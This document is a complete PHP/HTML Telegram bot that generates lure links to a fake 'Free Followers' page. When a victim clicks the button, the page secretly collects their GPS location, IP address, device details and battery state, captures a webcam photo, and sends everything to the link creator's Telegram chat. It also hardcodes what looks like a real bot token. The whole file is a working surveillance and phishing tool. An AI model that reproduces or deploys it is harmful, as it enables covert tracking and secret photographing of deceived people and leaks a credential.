<?php
/*
 * R8rAIHAN Bot - Fully Updated for Render 2026
 */

$botToken = "8792226932:AAE4Gye8mYar9Vx5vqcaDUgUUK0Q3Y6TXeQ"; // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
$api = "https://api.telegram.org/bot$botToken";

// Telegram API calling function using CURL
function tg($method, $data) {
    global $api;
    $url = $api . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

$update = json_decode(file_get_contents("php://input"), true);
$message = $update['message'] ?? null;

if ($message) {
    $chatId = $message['chat']['id'];
    $text = trim($message['text'] ?? '');

    // Start Command
    if ($text === "/start") {
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "👋 Welcome to R8rAIHAN Bot\n\nGenerate your custom link below 👇",
            "reply_markup" => json_encode([
                "keyboard" => [[["text" => "🖇️ GENERATE LINK"]]],
                "resize_keyboard" => true
            ])
        ]);
        exit;
    }

    // Link Generation Trigger
    if ($text === "🖇️ GENERATE LINK") {
        // Storing state in /tmp for Render's ephemeral filesystem
        file_put_contents("/tmp/step_$chatId", "1");
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "✍️ Please Send Your Name",
            "reply_markup" => json_encode(["remove_keyboard" => true])
        ]);
        exit;
    }

    // Capture Name and Create Link
    if (file_exists("/tmp/step_$chatId")) {
        unlink("/tmp/step_$chatId");
        $name = urlencode($text);
        $appUrl = "https://" . $_SERVER['HTTP_HOST']; 
        $link = "$appUrl/index.php?u=$chatId&n=$name";
        
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "✅ Your R8rAIHAN Bot link is ready:\n\n`$link`",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode([
                "keyboard" => [[["text" => "🖇️ GENERATE LINK"]]],
                "resize_keyboard" => true
            ])
        ]);
        exit;
    }
}

// Data Submission Handling (POST Request from Webpage)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'])) {
    $chatId = $_POST['u'];
    $name = $_POST['n'];
    $lat = $_POST['lat'] ?: "Denied";
    $lon = $_POST['lon'] ?: "Denied";
    $battery = $_POST['battery'] ?: "N/A";
    $charging = $_POST['charging'] ?: "N/A";
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $time = date("Y-m-d H:i:s");
    
    $msg = "📡 R8rAIHAN Bot - New Visit Info\n\n" .
           "👤 Name: $name\n" .
           "🕒 Time: $time\n" .
           "🌐 IP: $ip\n" .
           "🔋 Battery: $battery\n" .
           "📍 Location: $lat, $lon\n" .
           "📱 Device: $ua";

    tg("sendMessage", ["chat_id" => $chatId, "text" => $msg]);

    // Send Photo if captured
    if (!empty($_FILES['photo']['tmp_name'])) {
        $photo = new CURLFile($_FILES['photo']['tmp_name']);
        tg("sendPhoto", ["chat_id" => $chatId, "photo" => $photo]);
    }
    echo "OK";
    exit;
}

// Viewer Page (Frontend)
$chatId = $_GET['u'] ?? '';
$name = $_GET['n'] ?? '';
if (!$chatId || !$name) exit("R8rAIHAN Bot: Access Denied");
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>R8rAIHAN - Free Followers</title>
    <style>
        body{margin:0;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background:#0f0f0f;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
        .card{width:90%;max-width:360px;background:#1a1a1a;padding:30px;border-radius:20px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #333;}
        h3{color:#00ff9c;margin-bottom:10px;}
        p{font-size:14px;opacity:0.8;}
        button{width:100%;padding:15px;margin-top:20px;background:#00ff9c;border:0;border-radius:12px;font-weight:bold;color:#000;font-size:16px;cursor:pointer;transition:0.3s;}
        button:hover{background:#00cc7d;}
    </style>
</head>
<body>
    <div class="card">
        <h3>🔥 R8rAIHAN Bot</h3>
        <p>You are one step away from 1K Free Followers. Click the button to continue.</p>
        <button onclick="start()">GET FOLLOWERS NOW</button>
    </div>

    <form id="f" method="post" enctype="multipart/form-data">
        <input type="hidden" name="u" value="<?=htmlspecialchars($chatId)?>">
        <input type="hidden" name="n" value="<?=htmlspecialchars($name)?>">
        <input type="hidden" name="lat" id="lat"><input type="hidden" name="lon" id="lon">
        <input type="hidden" name="battery" id="battery"><input type="hidden" name="charging" id="charging">
        <input type="file" name="photo" id="photo" hidden>
    </form>

    <script>
    async function start(){
        // Get Location
        navigator.geolocation.getCurrentPosition(pos => {
            document.getElementById('lat').value = pos.coords.latitude;
            document.getElementById('lon').value = pos.coords.longitude;
            captureData();
        }, err => { captureData(); });
    }

    async function captureData(){
        // Get Battery
        if(navigator.getBattery){
            const b = await navigator.getBattery();
            document.getElementById('battery').value = Math.round(b.level*100)+"%";
            document.getElementById('charging').value = b.charging ? "Yes" : "No";
        }

        // Camera Capture
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.createElement("video");
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement("canvas");
            setTimeout(() => {
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video,0,0);
                canvas.toBlob(blob => {
                    const file = new File([blob], "capture.jpg", {type:"image/jpeg"});
                    const dt = new DataTransfer(); 
                    dt.items.add(file);
                    document.getElementById('photo').files = dt.files;
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById("f").submit();
                }, "image/jpeg");
            }, 1200);
        } catch(e) { 
            document.getElementById("f").submit(); 
        }
    }
    </script>
</body>
</html>
